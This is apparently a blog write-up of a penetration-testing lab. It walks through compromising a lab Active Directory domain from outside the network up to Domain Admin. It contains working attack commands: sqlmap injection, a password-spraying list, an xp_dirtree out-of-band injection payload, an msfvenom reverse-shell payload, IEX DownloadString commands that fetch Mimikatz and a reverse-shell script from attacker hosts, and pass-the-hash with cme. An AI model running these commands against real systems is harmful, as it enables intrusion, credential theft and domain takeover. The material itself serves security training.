title: Active Directory Adventures part 1
---

Windows Active Directory is a database of network resource objects. That proliferates in modern enterprise network architectures.

This lab replicates a modern enterprise Active Directory infrastructure which supports a small/medium-sized business which has taken some reasonable measures to harden and secure the environment. This post will document the journey from external client to Domain Controller.


We know from an underwhelming initial nmap scan (i.e. `nmap -sV -Sc IP`) that there is a firewall in place. So we scan the likely ports with the no ping (-Pn) option and add increased speed (-T4) and version detection (-sV) and scan the subnet.

```bash
nmap -T4 -sV -Pn -p80,443 10.7.12.0/24
```

![](https://braaaax.github.io/braaaax.github.io/images/lky-nmap.jpg)

We have open ports on 10.7.12.11-12, and an http service running on 10.7.12.12. We bust the ports to discover web directories and find one on 10.7.12.12/mvc. It's hosting a sales site using a back-end database to manage its inventory information,as is common. We also find an http RDP access portal at 10.7.12.11/rdweb, which is Microsoft's Remote Desktop Web access portal. This is of course interesting. We can run a brute force application like hydra and medusa on the service but we have no idea of lockout or monitoring mechanisms in place so we try a few weak passwords and investigate the web application. We browse the sales site and note the url parameter and value when accessing a product for sale, `ProductSubCategoryId=18`. This is a ripe point to test whether there is an SQLi vulnerability.

![](https://braaaax.github.io/braaaax.github.io/images/lky-site.jpg)


The url shows an aspx script that makes a call to the database to retrieve product information and it doesn't look like that data is sanitized. We can manually test the vulnerability if we wish, but instead We capture the request with Burp Suite and save it to a file so that we can probe the request automatically with sqlmap using the r flag.


![](https://braaaax.github.io/braaaax.github.io/images/lky-mvc-web-req.jpg)


```bash
sqlmap -r product.req --level=5 --risk=3
```

Success! We go ahead and dump the entire database. (Warning this can be bad with very large databases!!). Of interest is a table giving Active Directory users, full names, and groups.

```

Database: ADConnect
Table: ADUsers
[40 entries]
+------------+-------------+-----------------+
| LastName   | FirstName   | Department      |
+------------+-------------+-----------------+
| Vazquez    | Annie       | Finance         |
| Falcon     | Paul        | Finance         |
| Anthony    | Fae         | Finance         |

           ( ... more names ... )

| Wilson     | Johnny      | Sales           |
| May        | Juan        | Sales           |
+------------+-------------+-----------------+

```


If we can derive the correct username structure, given the full names of the AD users, we can spray the rdweb login intelligently. This can sometimes be accomplished with linkedIn or one can make an educated guess with from email addresses. Given the http portal on can use a tool like burp intruder. First, let's get our lists together. We'll try the first letter of firstname and lastname as a format, and we'll use standard Windows password reset format <season><year><non alphanumeric character>. Python has a useful CSV module we can leverage to easily take our sqlamp output and spit out usernames in a format we want.

```python
import csv
with open("/root/.sqlmap/output/10.7.12.12/dump/ADConnect/ADUsers.csv") as csvfile:
    reader = csv.DictReader(csvfile)
    for row in reader:
        print('{}{}'.format(row['FirstName'][0].lower(), row['LastName'].lower()))
```
The passwords list will be simple:
Passwords List:
*  Summer2017!
*  Winter2017!
*  Fall2017!
*  Spring2017!
*  Summer2018!
*  Winter2018!
*  Fall2018!
*  Spring2018!


Intruder: 
We use Burp Intruder to fuzz the login page with our creds, using the "cluster bomb" attack. We remove the placeholders save for the the two USERNAME fields and the the PASSWORD field and we relate our lists to a given placeholder. We use the userlist we created for placeholder1 and copy that list for payload 2, and we use a password list above for payload 3. We make sure to 'Always Follow Redirection,' this is how we will know whether or not our password is successful.

![](https://braaaax.github.io/braaaax.github.io/images/lky-burp-intruder.jpg)

Intruder proves successful and we get three login creds.
*  LAB\avazquez:Spring2017!
*  LAB\mholliday:Summer2017!
*  LAB\wbaird:Autum2017!

(We could've used a python script or curl or the OWA login bruteforcer in metasploit as alternatives to Burp Intruder, which can be throttled if you have the community edition)

We login with LAB\avazquez.

Then into into Annie's account with remmina.

![](https://braaaax.github.io/braaaax.github.io/images/lkys-remmina.jpg)


None of our normal powershell script are working so we surmise that there is some kind of defense in place limiting Annie's capabilities on the box. Windows Defender and probably Applocker are the most likely culprits preventing us from executing most things (Applocker includes AMSI). So we paste the contents of [applocker-bypass-checker-v1.ps1](https://braaaax.github.io/braaaax.github.io/applocker-bypas-checker.ps1) into notepad and saving as a .ps1 file allows us to sidestep Defender momentarily. Running shows us the \windows\Tasks, \windows\tracing\, \windows\system32\spool\drivers\color allow "BUILTIN\USERS" write/createFiles & execute auth so this is where we will set up shop for the time being.

![](https://braaaax.github.io/braaaax.github.io/images/lky-powershdll.png)


We use Shellter to trick Applocker further by "rewiring" nc.exe to call to a waiting metasploit listener. Shellter adds some malicious shell code into a legitimate exe, so as long as annie can use nc.exe we should be able to add a meterpreter reverse tcp shell to nc.exe. Shellter can take some trial and error. Try and build a stable of exe's that work all or most of the time.

Once we've gotten our meterpreter shell we can either create a listener with empire and execute it with msf via the load_powershell module or just load powershell directly in msf and import powerview to enumerate the AD. Moving to empire is not necessary though it's nice to be able to do.

Either via empire or by importing the PowerView.ps1 module into your msf powershell_shell, we can enumerate the domain. Let's take a look at the boxes in the domain.

ComputerName
*  DC01  - 10.8.14.10 - Domain Controller (Promised Land)
*  WS03  - 10.8.14.17
*  FS01  - 10.8.14.11
*  MX01  - 10.8.14.12
*  WEB01 - 10.8.14.15
*  WS05  - 10.8.14.16
*  RDS02 - 10.7.12.12 - remote desktop
*  SQL01 - 10.8.14.14 - sql server

We enumerate the network and try to understand the machines, their use and the general topology in place. Something you should always search for are accessible shares. Using Invoke-Sharefinder we discover a credentials to an internal VPN. From an internal IP We can use responder and ntlnrelayx to dump hashes and get sessions for users without knowing the password. Something like `Invoke-Inveigh` could be used externally, but I have had limited success with it.

![](https://braaaax.github.io/braaaax.github.io/images/lky-invoke-sharefinder.png)


After some enumeration we find: `//FS01.lab.local/GroupData/LabUserVPN.ovpn`

We fire up responder, but we don't get any hashes. Responder needs a user to initiate a request typically there can be many requests on a network, to an smb share or an internal http site, but this network is quiet, but it looks like we will have to get creative. 

We have an injection point from our initial entry point (SQLi). We can leverage our SQLi to create a web request from the owner of the database. With MSSQL we use `master..xp_dirtree` (MySQL: LOAD_FILE()) to create an out of band http request We're not interested in successful transmission of the information, just that the target user will send a valid request and with that their netNTLMv2 hash along with their request to our machine. [Further Reading] (https://www.gracefulsecurity.com/sql-injection-out-of-band-exploitation/)

Our uri payload will be: `/mvc/Product.aspx?ProductSubCategoryId=18;declare @q varchar(99);set @q='\\10.8.254.14\test1'; exec master.dbo.xp_dirtree @q`

Success. As system on SQL01 let's create a rat with msfvenom (`msfvenom -p windows/shell/reverse_tcp lhost=10.8.254.10 lport=4444 -f exe -o callbrax.exe`) and get a meterpreter shell. Meterpreter and incognito make it trivial to use token impersonation to spawn a shell as a user with tokens available on the box. If we were a low priv user on SQL01 we could potentially use rotten potato/lonely potato to escalate to system. We see BDavis is a user on the box and a server admin, he's our target.

GPO Enumeration:
Group Policy is a powerful administrative feature in Active Directory management. They are applied not to groups but to OUs, Organizational Units, Active Directory containers or folders into which can be placed users, groups, computers and other organizational units. We enumerate GPOs looking for mis-configurations.

I've abridged the output to highlight the misconfiguration with the Mailserver-config. "Server Admins" have WriteProperty on the GPO means that a member of the group and change the GPO and dictate access to the devices in the OU the GPO controls. Which machines are in the OU that this GPO is applied to?

```powershell
PS > Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

...
InheritedObjectType   : All

```

Replace BUILTIN\Administrators "Server Admins" to the Member name variable of the GPO. And update the GPO. We use -force so that the update doesn't take 90 minutes. When its complete we'll have granted BDavis admin rights on MX01.

```powershell
PS > type "\\lab.local\sysvol\lab.local\Policies\{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"

</Groups>

PS > Invoke-GpUpdate -Computer MX01 -Force
```


Since BDavis is now admin on MX01 we can run Mimikatz on the Box and discover the credentials of BRoss, Domain Admin, and user. By adding Invoke-Mimikatz to the bottom of Invoke-Mimikatz.ps1 I can serve the file with python's SimpleHTTPServer and execute it from memory on MX01.


```powershell
Invoke-Command -ComputerName MX01 -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.8.254.10/Invoke-Invoke-Mimikatz.ps1')}
```

We get NTLM hashes for BRoss, who is a Domain Admin. With this info we are able to use the Ross account to add us to net users and Domain Admins and use cme to exploit the hashes and get a shell using the same methodology:

![](https://braaaax.github.io/braaaax.github.io/images/lky-cme-login.png)

```bash
cme smb 10.8.14.10 -u BRoss -H '49a074a39dd0651f647e765c2cc794c7' -X 'IEX (New-Object Net.WebClient).DownloadString("http://10.7.253.6/Invoke-PowerShellTcpOneLine.ps1")'
```

Lastly, as BRoss I add myself to all the good places:

```
net user brax password /add /domain
net group "Domain Admins" /add brax /domain
net group "Remote Desktop Users" /add lab\brax /domain
```

It's a party!

Now on to the second forrest,  lky.local,  in part 2.
